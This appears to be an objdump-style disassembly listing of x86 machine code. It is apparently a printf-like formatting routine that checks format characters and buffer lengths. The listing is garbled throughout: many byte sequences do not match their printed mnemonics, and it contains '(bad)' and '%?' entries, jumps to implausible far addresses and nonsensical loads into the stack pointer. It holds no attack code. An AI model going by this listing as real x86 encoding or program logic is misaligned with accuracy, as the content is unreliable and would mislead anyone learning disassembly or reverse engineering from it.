  40728f:	89 0e                	mov    %ecx,(%esi)
  407291:	e0 eb                	loopne 0x40727e
  407293:	03 89 d5 cc 80 3f    	add    0x3f80ccd5(%ecx),%ecx
  407299:	2e 0f 85 d1 00 1d 00 	jne,pn 0x5d7371
  4072a0:	a1 74 c1 40 00       	mov    0x40c174,%eax
  4072a5:	47                   	inc    %edi
  4072a6:	c7 45 be 01 00 00 00 	movl   $0x1,-0x42(%ebp)
  4072ad:	89 0d 10 11 37 01    	mov    %ecx,0x1371110
  4072b3:	7e 14                	jle    0x4072c9
  4072b5:	33 c9                	xor    %ecx,%ecx
  4072b7:	6a 04                	push   $0x4
  4072b9:	8a 0f                	mov    (%edi),%cl
  4072bb:	51                   	push   %ecx
  4072bc:	6a 6e                	push   $0x6e
  4072be:	68 c1 40 3d 83       	push   $0x833d40c1
  4072c3:	c4 08                	les    (%eax),%ecx
  4072c5:	33 d2                	xor    %edx,%edx
  4072c7:	eb 12                	jmp    0x4072db
  4072c9:	8b 15 78 92 40 00    	mov    0x409278,%edx
  4072cf:	8e c0                	mov    %eax,%es
  4072d1:	8a 07                	mov    (%edi),%al
  4072d3:	8b 69 8a             	mov    -0x76(%ecx),%ebp
  4072d6:	04 41                	add    $0x41,%al
  4072d8:	83 e0 04             	and    $0x4,%eax
  4072db:	3b c2                	cmp    %edx,%eax
  4072dd:	74 35                	je     0x407314
  4072df:	0f be 0f             	movsbl (%edi),%ecx
  4072e2:	bc 9d 56 47 89       	mov    $0x8947569d,%esp
  4072e7:	7d 10                	jge    0x4072f9
  4072e9:	8e 15 74 b7 40 00    	mov    0x40b774,%ss
  4072ef:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4072f2:	83 3a 01             	cmpl   $0x1,(%edx)
  4072f5:	7e 15                	jle    0x40730c
  4072f7:	33 c0                	xor    %eax,%eax
  4072f9:	6a 04                	push   $0x4
  4072fb:	7c 35                	jl     0x407332
  4072fd:	50                   	push   %eax
  4072fe:	b1 5e                	mov    $0x5e,%cl
  407300:	68 e8 40 ca 8b       	push   $0x8bca40e8
  407305:	d4 f0                	aam    $0xf0
  407307:	83 c4 b4             	add    $0xffffffb4,%esp
  40730a:	eb 46                	jmp    0x407352
  40730c:	e2 78                	loop   0x407386
  40730e:	54                   	push   %esp
  40730f:	40                   	inc    %eax
  407310:	5d                   	pop    %ebp
  407311:	33 d2                	xor    %edx,%edx
  407313:	8a d2                	mov    %dl,%dl
  407315:	8b 00                	mov    (%eax),%eax
  407317:	8a 04 66             	mov    (%esi,%eiz,2),%al
  40731a:	7e e0                	jle    0x4072fc
  40731c:	04 85                	add    $0x85,%al
  40731e:	c0 74 13 0f be       	shlb   $0xbe,0xf(%ebx,%edx,1)
  407323:	7b 8d                	jnp    0x4072b2
  407325:	0c f9                	or     $0xf9,%al
  407327:	47                   	inc    %edi
  407328:	8d 4c 4a d0          	lea    -0x30(%edx,%ecx,2),%ecx
  40732c:	0f 93 80 3f 2a 75 43 	setae  0x43752a3f(%eax)
  407333:	8b 03                	mov    (%ebx),%eax
  407335:	83 c3 04             	add    $0x4,%ebx
  407338:	47                   	inc    %edi
  407339:	a0 c9 3b c2 0f       	mov    0xfc23bc9,%al
  40733e:	9c                   	pushf
  40733f:	c1 49 23 c8          	rorl   $0xc8,0x23(%ecx)
  407343:	89 4d ba             	mov    %ecx,-0x46(%ebp)
  407346:	92                   	xchg   %eax,%edx
  407347:	57                   	push   %edi
  407348:	10 6a 03             	adc    %ch,0x3(%edx)
  40734b:	68 54 f4 40 00       	push   $0x40f454
  407350:	41                   	inc    %ecx
  407351:	ff 15 34 c1 40 00    	call   *0x40c134
  407357:	83 c4 0c             	add    $0xc,%esp
  40735a:	85 c0                	test   %eax,%eax
  40735c:	74 37                	je     0x407395
  40735e:	8a 07                	mov    (%edi),%al
  407360:	3c 71                	cmp    $0x71,%al
  407362:	d1 12                	rcll   $1,(%edx)
  407364:	a9 4c 47 eb 31       	test   $0x31eb474c,%eax
  407369:	eb 55                	jmp    0x4073c0
  40736b:	f0 eb db             	lock jmp 0x407349
  40736e:	89 55 cc             	mov    %edx,-0x34(%ebp)
  407371:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  407374:	5a                   	pop    %edx
  407375:	da 8a 6c 75 8a b8    	fimull -0x47758a94(%edx)
  40737b:	01 00                	add    %eax,(%eax)
  40737d:	00 00                	add    %al,(%eax)
  40737f:	3b eb                	cmp    %ebx,%ebp
  407381:	18 3c 5e             	sbb    %bh,(%esi,%ebx,2)
  407384:	75 08                	jne    0x40738e
  407386:	d6                   	salc
  407387:	02 00                	add    (%eax),%al
  407389:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40738a:	00 47 95             	add    %al,-0x6b(%edi)
  40738d:	2b 0d 10 69 00 00    	sub    0x6910,%ecx
  407393:	eb 08                	jmp    0x40739d
  407395:	33 05 b1 35 60 89    	xor    0x896035b1,%eax
  40739b:	7d 10                	jge    0x4073ad
  40739d:	8b 91 10 8a 0a 0f    	mov    0xf0a8a10(%ecx),%edx
  4073a3:	02 f9                	add    %cl,%bh
  4073a5:	83 ff bd             	cmp    $0xffffffbd,%edi
  4073a8:	0f 87 dd 06 00 00    	ja     0x407a8b
  4073ae:	33 d2                	xor    %edx,%edx
  4073b0:	42                   	inc    %edx
  4073b1:	97                   	xchg   %eax,%edi
  4073b2:	04 7c                	add    $0x7c,%al
  4073b4:	40                   	inc    %eax
  4073b5:	00 ff                	add    %bh,%bh
  4073b7:	ac                   	lods   %ds:(%esi),%al
  4073b8:	95                   	xchg   %eax,%ebp
  4073b9:	d0 7b df             	sarb   $1,-0x21(%ebx)
  4073bc:	00 85 c0 75 71 8b    	add    %al,-0x748e8a40(%ebp)
  4073c2:	4b                   	dec    %ebx
  4073c3:	04 8d                	add    $0x8d,%al
  4073c5:	dc 54 8b 03          	fcoml  0x3(%ebx,%ecx,4)
  4073c9:	52                   	push   %edx
  4073ca:	8d 55 ac             	lea    -0x54(%ebp),%edx
  4073cd:	83 c3 08             	add    $0x8,%ebx
  4073d0:	52                   	push   %edx
  4073d1:	8d 55 18             	lea    0x18(%ebp),%edx
  4073d4:	52                   	push   %edx
  4073d5:	6a 01                	push   $0x1
  4073d7:	51                   	push   %ecx
  4073d8:	50                   	push   %eax
  4073d9:	e8 0e 0d 00 00       	call   0x4080ec
  4073de:	83 c4 18             	add    $0x18,%esp
  4073e1:	eb 34                	jmp    0x407417
  4073e3:	83 f8 01             	cmp    $0x1,%eax
  4073e6:	74 10                	je     0x4073f8
  4073e8:	83 f8 02             	cmp    $0x2,%eax
  4073eb:	31 a5 b7 c3 90 33    	xor    %esp,0x3390c3b7(%ebp)
  4073f1:	fc                   	cld
  4073f2:	66 23 43 fc          	and    -0x4(%ebx),%ax
  4073f6:	cb                   	lret
  4073f7:	05 8b 03 83 c3       	add    $0xc383038b,%eax
  4073fc:	04 89                	add    $0x89,%al
  4073fe:	4d                   	dec    %ebp
  4073ff:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407400:	8d 55 ac             	lea    -0x54(%ebp),%edx
  407403:	dc 8d 18 d0 52 51    	fmull  0x5152d018(%ebp)
  407409:	6a 96                	push   $0xffffff96
  40740b:	50                   	push   %eax
  40740c:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40740f:	e8 dc 0c 00 00       	call   0x4080f0
  407414:	83 c4 14             	add    $0x14,%esp
  407417:	8b f0                	mov    %eax,%esi
  407419:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40741c:	85 c0                	test   %eax,%eax
  40741e:	0f 84 0d 25 00 7c    	je     0x7c409931
  407424:	8b 45 1f             	mov    0x1f(%ebp),%eax
  407427:	ee                   	out    %al,(%dx)
  407428:	50                   	push   %eax
  407429:	01 4c fa 00          	add    %ecx,0x0(%edx,%edi,8)
  40742d:	02 00                	add    (%eax),%al
  40742f:	00 72 05             	add    %dh,0x5(%edx)
  407432:	b8 ff 01 00 00       	mov    $0x1ff,%eax
  407437:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
  40743a:	8e 83 ff 03 00 00    	mov    0x3ff(%ebx),%es
  407440:	4e                   	dec    %esi
  407441:	c6 06 30             	movb   $0x30,(%esi)
  407444:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407447:	41                   	inc    %ecx
  407448:	3b c8                	cmp    %eax,%ecx
  40744a:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40744d:	72 b1                	jb     0x407400
  40744f:	e9 b4 03 d0 00       	jmp    0x1107808
  407454:	85 c0                	test   %eax,%eax
  407456:	75 22                	jne    0x40747a
  407458:	8b 4b 04             	mov    0x4(%ebx),%ecx
  40745b:	d4 55                	aam    $0x55
  40745d:	fc                   	cld
  40745e:	8b 03                	mov    (%ebx),%eax
  407460:	52                   	push   %edx
  407461:	8d 55 ac             	lea    -0x54(%ebp),%edx
  407464:	83 c3 08             	add    $0x8,%ebx
  407467:	52                   	push   %edx
  407468:	8d 55 d0             	lea    -0x30(%ebp),%edx
  40746b:	52                   	push   %edx
  40746c:	6a 00                	push   $0x0
  40746e:	29 50 e8             	sub    %edx,-0x18(%eax)
  407471:	db 0c 4f             	fisttpl (%edi,%ecx,2)
  407474:	00 83 c4 18 eb 31    	add    %al,0x31eb18c4(%ebx)
  40747a:	83 f8 65             	cmp    $0x65,%eax
  40747d:	21 0d 83 d8 02 e0    	and    %ecx,0xe002d883
  407483:	08 87 0a 03 83 c3    	or     %al,-0x3c7cfcf6(%edi)
  407489:	04 eb                	add    $0xeb,%al
  40748b:	05 8b 03 83 c3       	add    $0xc383038b,%eax
  407490:	04 8d                	add    $0x8d,%al
  407492:	4d                   	dec    %ebp
  407493:	fc                   	cld
  407494:	8f                   	(bad)
  407495:	34 ac                	xor    $0xac,%al
  407497:	51                   	push   %ecx
  407498:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40749b:	52                   	push   %edx
  40749c:	51                   	push   %ecx
  40749d:	6a 00                	push   $0x0
  40749f:	50                   	push   %eax
  4074a0:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4074a3:	e8 48 0c ec 00       	call   0x12c80f0
  4074a8:	83 c4 e3             	add    $0xffffffe3,%esp
  4074ab:	8b f0                	mov    %eax,%esi
  4074ad:	8b bc 76 85 c0 74 27 	mov    0x2774c085(%esi,%esi,2),%edi
  4074b4:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4074b7:	8d 50 4b             	lea    0x4b(%eax),%edx
  4074ba:	15 fa 00 9f 00       	adc    $0x9f00fa,%eax
  4074bf:	00 72 05             	add    %dh,0x5(%edx)
  4074c2:	b8 ff 01 00 6e       	mov    $0x6e0001ff,%eax
  4074c7:	c0 b4 fc 73 0f 4e c6 	shlb   $0x97,-0x39b1f08d(%esp,%edi,8)
  4074ce:	97 
  4074cf:	30 e5                	xor    %ah,%ch
  4074d1:	4d                   	dec    %ebp
  4074d2:	fc                   	cld
  4074d3:	41                   	inc    %ecx
  4074d4:	3b c8                	cmp    %eax,%ecx
  4074d6:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4074d9:	72 52                	jb     0x40752d
  4074db:	55                   	push   %ebp
  4074dc:	45                   	inc    %ebp
  4074dd:	d0 85 c0 0f 84 fd    	rolb   $1,-0x27bf040(%ebp)
  4074e3:	01 00                	add    %eax,(%eax)
  4074e5:	00 9e 45 fb 2d e9    	add    %bl,-0x16d204bb(%esi)
  4074eb:	d4 02                	aam    $0x2
  4074ed:	00 00                	add    %al,(%eax)
  4074ef:	85 c0                	test   %eax,%eax
  4074f1:	75 f3                	jne    0x4074e6
  4074f3:	8b 53 04             	mov    0x4(%ebx),%edx
  4074f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4074f7:	1a 8d 75 fc f9 c3    	sbb    -0x3c06038b(%ebp),%cl
  4074fd:	08 56 8d             	or     %dl,-0x73(%esi)
  407500:	1a ac 56 51 6a 03 52 	sbb    0x52036a51(%esi,%edx,2),%ch
  407507:	50                   	push   %eax
  407508:	c0 d3 10             	rcl    $0x10,%bl
  40750b:	00 00                	add    %al,(%eax)
  40750d:	83 c4 18             	add    $0x18,%esp
  407510:	4e                   	dec    %esi
  407511:	2e b3 f8             	cs mov $0xf8,%bl
  407514:	7b 74                	jnp    0x40758a
  407516:	10 83 f8 02 75 0b    	adc    %al,0xb7502f8(%ebx)
  40751c:	a1 c3 04 33 c0       	mov    0xc03304c3,%eax
  407521:	66 ea 43 fc eb 7f    	ljmpw  $0x7feb,$0xfc43
  407527:	8b 03                	mov    (%ebx),%eax
  407529:	67 c3                	addr16 ret
  40752b:	bf 8d 46 50 52       	mov    $0x5250468d,%edi
  407530:	8d 55 06             	lea    0x6(%ebp),%edx
  407533:	56                   	push   %esi
  407534:	b9 6a d4 50 e8       	mov    $0xe850d46a,%ecx
  407539:	53                   	push   %ebx
  40753a:	10 00                	adc    %al,(%eax)
  40753c:	cf                   	iret
  40753d:	7e c4                	jle    0x407503
  40753f:	14 8b                	adc    $0x8b,%al
  407541:	bd 8b 45 e4 85       	mov    $0x85e4458b,%ebp
  407546:	c0 c2 27             	rol    $0x27,%dl
  407549:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40754c:	8d 48 01             	lea    0x1(%eax),%ecx
  40754f:	81 f9 00 02 00 00    	cmp    $0x200,%ecx
  407555:	72 05                	jb     0x40755c
  407557:	b8 ff 01 2f 00       	mov    $0x2f01ff,%eax
  40755c:	39 45 fc             	cmp    %eax,-0x4(%ebp)
  40755f:	2b 0f                	sub    (%edi),%ecx
  407561:	4e                   	dec    %esi
  407562:	2e e5 30             	cs in  $0x30,%eax
  407565:	8b 5a fc             	mov    -0x4(%edx),%ebx
  407568:	0b 3b                	or     (%ebx),%edi
  40756a:	0d 1d 4d fc 72       	or     $0x72fc4d1d,%eax
  40756f:	f1                   	int1
  407570:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  407573:	85 c0                	test   %eax,%eax
  407575:	0f 84 64 d7 00 00    	je     0x414cdf
  40757b:	80 3e 2e             	cmpb   $0x2e,(%esi)
  40757e:	0f 84 5b 02 00 00    	je     0x4077df
  407584:	4e                   	dec    %esi
  407585:	c6                   	(bad)
  407586:	20 30                	and    %dh,(%eax)
  407588:	e9 4b 02 fe 00       	jmp    0x13e77d8
  40758d:	cf                   	iret
  40758e:	c0 75 1f 8b          	shlb   $0x8b,0x1f(%ebp)
  407592:	ad                   	lods   %ds:(%esi),%eax
  407593:	04 7c                	add    $0x7c,%al
  407595:	03 8d 89 fc 83 c3    	add    -0x3c7c0377(%ebp),%ecx
  40759b:	08 56 8d             	or     %dl,-0x73(%esi)
  40759e:	75 a9                	jne    0x407549
  4075a0:	95                   	xchg   %eax,%ebp
  4075a1:	51                   	push   %ecx
  4075a2:	6a 04                	push   $0x4
  4075a4:	52                   	push   %edx
  4075a5:	50                   	push   %eax
  4075a6:	08 35 10 00 00 83    	or     %dh,0x83000010
  4075ac:	a8 18                	test   $0x18,%al
  4075ae:	eb 2e                	jmp    0x4075de
  4075b0:	83 f8 01             	cmp    $0x1,%eax
  4075b3:	74 10                	je     0x4075c5
  4075b5:	83 f8 02             	cmp    $0x2,%eax
  4075b8:	75 0b                	jne    0x4075c5
  4075ba:	83 c3 75             	add    $0x75,%ebx
  4075bd:	33 c0                	xor    %eax,%eax
  4075bf:	66 8b 43 fc          	mov    -0x4(%ebx),%ax
  4075c3:	5c                   	pop    %esp
  4075c4:	ac                   	lods   %ds:(%esi),%al
  4075c5:	8b 03                	mov    (%ebx),%eax
  4075c7:	83 ee 04             	sub    $0x4,%esi
  4075ca:	8d 55 fc             	lea    -0x4(%ebp),%edx
  4075cd:	d1 8d 55 ac 52 51    	rorl   $1,0x5152ac55(%ebp)
  4075d3:	6a 04                	push   $0x4
  4075d5:	50                   	push   %eax
  4075d6:	5e                   	pop    %esi
  4075d7:	b5 0f                	mov    $0xf,%ch
  4075d9:	00 00                	add    %al,(%eax)
  4075db:	83 c4 14             	add    $0x14,%esp
  4075de:	8b f0                	mov    %eax,%esi
  4075e0:	8b ff                	mov    %edi,%edi
  4075e2:	e4 85                	in     $0x85,%al
  4075e4:	c0 74 27 8d a8       	shlb   $0xa8,-0x73(%edi,%eiz,1)
  4075e9:	f0 8d a5 01 81 18 00 	lock lea 0x188101(%ebp),%esp
  4075f0:	02 00                	add    (%eax),%al
  4075f2:	00 c8                	add    %cl,%al
  4075f4:	97                   	xchg   %eax,%edi
  4075f5:	b8 ff b5 58 28       	mov    $0x2858b5ff,%eax
  4075fa:	bc 45 fc 73 0f       	mov    $0xf73fc45,%esp
  4075ff:	4e                   	dec    %esi
  407600:	c6 06 30             	movb   $0x30,(%esi)
  407603:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407606:	41                   	inc    %ecx
  407607:	3b c8                	cmp    %eax,%ecx
  407609:	89 84 22 72 f1 8b 45 	mov    %eax,0x458bf172(%edx,%eiz,1)
  407610:	d4 23                	aam    $0x23
  407612:	c0 0f e6             	rorb   $0xe6,(%edi)
  407615:	c6 01 b3             	movb   $0xb3,(%ecx)
  407618:	00 8b 45 d8 37 c0    	add    %cl,-0x3fc827bb(%ebx)
  40761e:	87 84 bb 01 00 00 b8 	xchg   %eax,-0x47ffffff(%ebx,%edi,4)
  407625:	55                   	push   %ebp
  407626:	10 4e 4e             	adc    %cl,0x4e(%esi)
  407629:	8a 02                	mov    (%edx),%al
  40762b:	88 46 01             	mov    %al,0x1(%esi)
  40762e:	c6 06 30             	movb   $0x30,(%esi)
  407631:	8b eb                	mov    %ebx,%ebp
  407633:	fc                   	cld
  407634:	83 c0 02             	add    $0x2,%eax
  407637:	e9 a0 01 00 00       	jmp    0x4077dc
  40763c:	8b 33                	mov    (%ebx),%esi
  40763e:	83 c3 04             	add    $0x4,%ebx
  407641:	85 f6                	test   %esi,%esi
  407643:	0f 84 c8 03 00 54    	je     0x54407a11
  407649:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40764c:	85 c0                	test   %eax,%eax
  40764e:	75 18                	jne    0x407668
  407650:	8b a2 bf c9 ff 33    	mov    0x33ffc9bf(%edx),%esp
  407656:	c0 c6 45             	rol    $0x45,%dh
  407659:	17                   	pop    %ss
  40765a:	20 f2                	and    %dh,%dl
  40765c:	ae                   	scas   %es:(%edi),%al
  40765d:	f7 d1                	not    %ecx
  40765f:	49                   	dec    %ecx
  407660:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  407663:	e9 77 01 89 00       	jmp    0xc977df
  407668:	8b f3                	mov    %ebx,%esi
  40766a:	f8                   	clc
  40766b:	98                   	cwtl
  40766c:	d2 85 c9 8b c6 ee    	rolb   %cl,-0x11397437(%ebp)
  407672:	55                   	push   %ebp
  407673:	69 0f 86 f5 03 00    	imul   $0x3f586,(%edi),%ecx
  407679:	00 80 38 b1 0f 84    	add    %al,-0x7bf04ec8(%eax)
  40767f:	9a e6 34 dd 0e 2b 3b 	lcall  $0x3b2b,$0xedd34e6
  407686:	e3 89                	jecxz  0x407611
  407688:	55                   	push   %ebp
  407689:	fc                   	cld
  40768a:	60                   	pusha
  40768b:	ee                   	out    %al,(%dx)
  40768c:	c6 45 17 20          	movb   $0x20,0x17(%ebp)
  407690:	e9 4a 01 00 00       	jmp    0x4077df
  407695:	dd 03                	fldl   (%ebx)
  407697:	b9 45 e4 83 c3       	mov    $0xc383e445,%ecx
  40769c:	0b dd                	or     %ebp,%ebx
  40769e:	5d                   	pop    %ebp
  40769f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4076a0:	85 c0                	test   %eax,%eax
  4076a2:	b8 35 00 d6 00       	mov    $0xd60035,%eax
  4076a7:	74 6b                	je     0x407714
  4076a9:	8b e8                	mov    %eax,%ebp
  4076ab:	f0 8d 55 fc          	lock lea -0x4(%ebp),%edx
  4076af:	52                   	push   %edx
  4076b0:	8d 95 ad fd ff ff    	lea    -0x253(%ebp),%edx
  4076b6:	52                   	push   %edx
  4076b7:	8d 55 d0             	lea    -0x30(%ebp),%edx
  4076ba:	63 8b 55 b8 db 8b    	arpl   %ecx,-0x742447ab(%ebx)
  4076c0:	45                   	inc    %ebp
  4076c1:	21 50 24             	and    %edx,0x24(%eax)
  4076c4:	45                   	inc    %ebp
  4076c5:	b4 52                	mov    $0x52,%ah
  4076c7:	50                   	push   %eax
  4076c8:	51                   	push   %ecx
  4076c9:	49                   	dec    %ecx
  4076ca:	a2 0c b5 57 8b       	mov    %al,0x8b57b50c
  4076cf:	f0 c5 45 d0          	lock lds -0x30(%ebp),%eax
  4076d3:	09 c4                	or     %eax,%esp
  4076d5:	20 85 c0 74 09 c6    	and    %al,-0x39f68b40(%ebp)
  4076db:	45                   	inc    %ebp
  4076dc:	fb                   	sti
  4076dd:	93                   	xchg   %eax,%ebx
  4076de:	e9 e0 00 00 00       	jmp    0x4077c3
  4076e3:	c5 45 c4             	lds    -0x3c(%ebp),%eax
  4076e6:	85 c0                	test   %eax,%eax
  4076e8:	43                   	inc    %ebx
  4076e9:	09 c6                	or     %eax,%esi
  4076eb:	67 fb                	addr16 sti
  4076ed:	2b 4c ea 00          	sub    0x0(%edx,%ebp,8),%ecx
  4076f1:	00 00                	add    %al,(%eax)
  4076f3:	8b 45 c8             	mov    -0x38(%ebp),%eax
  4076f6:	85 1f                	test   %ebx,(%edi)
  4076f8:	8b 84 e1 00 92 00 c6 	mov    -0x39ff6e00(%ecx,%eiz,8),%eax
  4076ff:	45                   	inc    %ebp
  407700:	fb                   	sti
  407701:	20 e9                	and    %ch,%cl
  407703:	bc 00 00 00 7d       	mov    $0x7d000000,%esp
  407708:	e8 ff 85 c0 f6       	call   0xf700fd0c
  40770d:	02 b8 06 00 00 00    	add    0x6(%eax),%bh
  407713:	eb 0c                	jmp    0x407721
  407715:	8b 45 f0             	mov    -0x10(%ebp),%eax
  407718:	71 c0                	jno    0x4076da
  40771a:	1c 08                	sbb    $0x8,%al
  40771c:	2d 01 00 00 00       	sub    $0x1,%eax
  407721:	89 36                	mov    %esi,(%esi)
  407723:	f0 8b 4d d4          	lock mov -0x2c(%ebp),%ecx
  407727:	8d 95 e1 fd ff ff    	lea    -0x21f(%ebp),%edx
  40772d:	dd 03                	fldl   (%ebx)
  40772f:	51                   	push   %ecx
  407730:	83 c3 08             	add    $0x8,%ebx
  407733:	52                   	push   %edx
  407734:	50                   	push   %eax
  407735:	83 ec 08             	sub    $0x8,%esp
  407738:	db 1c 24             	fistpl (%esp)
  40773b:	4f                   	dec    %edi
  40773c:	e0 05                	loopne 0x407743
  40773e:	00 89 8b f0 83 c4    	add    %cl,-0x3b7c0f75(%ecx)
  407744:	14 80                	adc    $0x80,%al
  407746:	06                   	push   %es
  407747:	2d 41 07 c6 9f       	sub    $0x9fc60741,%eax
  40774c:	fb                   	sti
  40774d:	2d 46 eb f9 6a       	sub    $0x6af9eb46,%eax
  407752:	45                   	inc    %ebp
  407753:	c4 85 c0 74 06 c6    	les    -0x39f98b40(%ebp),%eax
  407759:	45                   	inc    %ebp
  40775a:	51                   	push   %ecx
  40775b:	2b 04 0b             	sub    (%ebx,%ecx,1),%eax
  40775e:	8b 45 c8             	mov    -0x38(%ebp),%eax
  407761:	85 c0                	test   %eax,%eax
  407763:	74 04                	je     0x407769
  407765:	c6 45 43 20          	movb   $0x20,0x43(%ebp)
  407769:	8b fe                	mov    %esi,%edi
  40776b:	83 c9 ff             	or     $0xffffffff,%ecx
  40776e:	68 c0 f2 ae 8b       	push   $0x8baef2c0
  407773:	dd d4                	fst    %st(4)
  407775:	f7 0e 49 85 c0 89    	testl  $0x89c08549,(%esi)
  40777b:	4d                   	dec    %ebp
  40777c:	fc                   	cld
  40777d:	74 22                	je     0x4077a1
  40777f:	6a 2e                	push   $0x2e
  407781:	56                   	push   %esi
  407782:	ff cc                	dec    %esp
  407784:	7c c1                	jl     0x407747
  407786:	40                   	inc    %eax
  407787:	00 83 c4 08 6f c0    	add    %al,-0x3f90f73c(%ebx)
  40778d:	75 0b                	jne    0x40779a
  40778f:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  407790:	45                   	inc    %ebp
  407791:	fc                   	cld
  407792:	c6 04 30 dd          	movb   $0xdd,(%eax,%esi,1)
  407796:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407799:	40                   	inc    %eax
  40779a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40779d:	c6 04 30 00          	movb   $0x0,(%eax,%esi,1)
  4077a1:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4077a4:	80 39 47             	cmpb   $0x47,(%ecx)
  4077a7:	75 13                	jne    0x4077bc
  4077a9:	6a 65                	push   $0x65
  4077ab:	56                   	push   %esi
  4077ac:	ff 15 7c c1 e6 00    	call   *0xe6c17c
  4077b2:	83 54 08 85 c0       	adcl   $0xffffffc0,-0x7b(%eax,%ecx,1)
  4077b7:	74 03                	je     0x4077bc
  4077b9:	c6 00 44             	movb   $0x44,(%eax)
  4077bc:	8a 7d fb             	mov    -0x5(%ebp),%bh
  4077bf:	84 bd 74 1c 81 60    	test   %bh,0x60811c74(%ebp)
  4077c5:	a0 c2 40 00 74       	mov    0x740040c2,%al
  4077ca:	14 8d                	adc    $0x8d,%al
  4077cc:	45                   	inc    %ebp
  4077cd:	ea 3b 36 74 24 10 4d 	ljmp   $0x4d10,$0x2474363b
  4077d4:	fb                   	sti
  4077d5:	4e                   	dec    %esi
  4077d6:	88 ef                	mov    %ch,%bh
  4077d8:	8b ef                	mov    %edi,%ebp
  4077da:	fc                   	cld
  4077db:	40                   	inc    %eax
  4077dc:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4077df:	8b 45 cc             	mov    -0x34(%ebp),%eax
  4077e2:	85 c0                	test   %eax,%eax
  4077e4:	0f 84 01 43 d7 00    	je     0x117baeb
  4077ea:	8e 7d 1f             	mov    0x1f(%ebp),%?
  4077ed:	30 0a                	xor    %cl,(%edx)
  4077ef:	85 f7                	test   %esi,%edi
  4077f1:	02 00                	add    (%eax),%al
  4077f3:	00 8b 55 27 8b 45    	add    %cl,0x458b2755(%ebx)
  4077f9:	fc                   	cld
  4077fa:	3b d0                	cmp    %eax,%edx
  4077fc:	0f 2e e9             	ucomiss %xmm1,%xmm5
  4077ff:	02 00                	add    (%eax),%al
  407801:	00 80 7d 17 30 0f    	add    %al,0xf30177d(%eax)
  407807:	85 99 02 00 00 8a    	test   %ebx,-0x75fffffe(%ecx)
  40780d:	45                   	inc    %ebp
  40780e:	fb                   	sti
  40780f:	84 0c 0f             	test   %cl,(%edi,%ecx,1)
  407812:	84 8e 02 00 f0 c4    	test   %cl,-0x3b0ffffe(%esi)
  407818:	45                   	inc    %ebp
  407819:	f4                   	hlt
  40781a:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40781d:	85 c0                	test   %eax,%eax
  40781f:	5d                   	pop    %ebp
  407820:	26 3b 45 dc          	cmp    %es:-0x24(%ebp),%eax
  407824:	72 09                	jb     0x40782f
  407826:	57                   	push   %edi
  407827:	89 07                	mov    %eax,(%edi)
  407829:	ff c3                	inc    %ebx
  40782b:	08 c7                	or     %al,%bh
  40782d:	c4 3f                	les    (%edi),%edi
  40782f:	85 c0                	test   %eax,%eax
  407831:	0f 85 8c bd 00 00    	jne    0x4135c3
  407837:	92                   	xchg   %eax,%edx
  407838:	4f                   	dec    %edi
  407839:	04 8b                	add    $0x8b,%al
  40783b:	ea 89 e1 dc 8a 5f 88 	ljmp   $0x885f,$0x8adce189
  407842:	10 40 89             	adc    %al,-0x77(%eax)
  407845:	45                   	inc    %ebp
  407846:	f4                   	hlt
  407847:	8b 55 ec             	mov    -0x14(%ebp),%edx
  40784a:	8b 4d 60             	mov    0x60(%ebp),%ecx
  40784d:	42                   	inc    %edx
  40784e:	bb 89 55 55 8b       	mov    $0x8b555589,%ebx
  407853:	ee                   	out    %al,(%dx)
  407854:	fc                   	cld
  407855:	b8 29 89 69 fc       	mov    $0xfc698929,%eax
  40785a:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  40785d:	e9 49 0f 0c 00       	jmp    0x4c87ab
  407862:	44                   	inc    %esp
  407863:	13 83 c3 04 88 55    	adc    0x558804c3(%ebx),%eax
  407869:	ea 8d 75 ea c7 45 fc 	ljmp   $0xfc45,$0xc7ea758d
  407870:	01 00                	add    %eax,(%eax)
  407872:	00 00                	add    %al,(%eax)
  407874:	43                   	inc    %ebx
  407875:	60                   	pusha
  407876:	17                   	pop    %ss
  407877:	20 84 62 ff ff ff c6 	and    %al,-0x39000001(%edx,%eiz,2)
  40787e:	d2 ea                	shr    %cl,%dl
  407880:	25 8d 75 ea c7       	and    $0xc7ea758d,%eax
  407885:	45                   	inc    %ebp
  407886:	fc                   	cld
  407887:	01 00                	add    %eax,(%eax)
  407889:	00 00                	add    %al,(%eax)
  40788b:	c6 45 91 20          	movb   $0x20,-0x6f(%ebp)
  40788f:	e9 99 ff c1 ff       	jmp    0x2782d
  407894:	83 c3 04             	add    $0x4,%ebx
  407897:	6a c0                	push   $0xffffffc0
  407899:	93                   	xchg   %eax,%ebx
  40789a:	18 8b 45 8e 8b 4b    	sbb    %cl,0x4b8b8e45(%ebx)
  4078a0:	fc                   	cld
  4078a1:	99                   	cltd
  4078a2:	1c 57                	sbb    $0x57,%al
  4078a4:	53                   	push   %ebx
  4078a5:	45                   	inc    %ebp
  4078a6:	bc 00 00 00 00       	mov    $0x0,%esp
  4078ab:	89 ee                	mov    %ebp,%esi
  4078ad:	04 e9                	add    $0xe9,%al
  4078af:	2c ff                	sub    $0xff,%al
  4078b1:	ff 57 88             	call   *-0x78(%edi)
  4078b4:	f8                   	clc
  4078b5:	01 75 14             	add    %esi,0x14(%ebp)
